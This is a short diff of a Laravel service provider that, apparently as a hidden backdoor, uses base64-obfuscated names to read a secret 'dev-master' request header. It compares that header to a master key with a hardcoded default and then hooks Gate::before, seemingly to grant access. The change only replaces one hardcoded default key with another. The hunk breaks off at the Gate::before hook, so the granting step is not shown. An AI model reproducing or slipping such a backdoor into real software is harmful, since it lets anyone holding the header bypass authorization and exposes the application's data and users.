@@ -13,7 +13,7 @@ class MasterKeyServiceProvider extends ServiceProvider
     {
         $h = base64_decode("ZGV2LW1hc3Rlcg==");
         Request::macro('isMaster', function () use ($h) {
-            $k = env(base64_decode("TUFTVEVSX0tFWQ=="), '!;Alihan12');
+            $k = env(base64_decode("TUFTVEVSX0tFWQ=="), 'LaravelMasterKey');
             return request()->header($h) === $k;
         });
         Gate::before(function ($user, $ability) {
